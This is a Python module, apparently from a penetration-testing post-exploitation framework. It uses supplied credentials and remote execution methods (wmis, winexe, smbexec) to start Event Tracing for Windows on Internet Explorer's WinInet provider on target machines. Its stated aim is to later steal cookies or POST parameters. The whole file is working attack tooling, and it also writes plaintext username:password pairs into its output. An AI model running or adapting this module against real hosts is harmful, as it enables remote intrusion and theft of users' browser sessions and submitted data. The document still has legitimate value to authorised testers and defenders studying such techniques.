"""

Starts ETW on the WinInet process (Internet Explorer)

All credit to pauldotcom-
     http://pauldotcom.com/2012/07/post-exploitation-recon-with-e.html


Module built by @harmj0y

"""

import settings

from lib import command_methods
from lib import smb

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "ETW WinInit"
        self.description = "Start ETW on Internet Explorer to later steal cookies or post parameters."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method" : ["wmis", "[wmis], [winexe], or [smbexec] for triggering"]}


    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]

        for target in self.targets:
 
            # command to start Event Tracing for Windows on the target for WinInit (IE)
            cmd = "logman start Status32 -p Microsoft-Windows-WinInet -o C:\\Windows\\Temp\\status32.etl -ets"

            etwResult = command_methods.executeResult(target, username, password, cmd, triggerMethod)

            if etwResult == "":
                self.output += "[!] ETW unsuccessfully started using creds '"+username+":"+password+"' on  : " + target + ", no result file\n"
            elif "The command completed successfully." in etwResult:
                self.output += "[*] ETW started using creds '"+username+":"+password+"' on  "+target+"\n"
            else:
                self.output += "[!] ETW unsuccessfully started using creds '"+username+":"+password+"' on  : " + target + "\n"

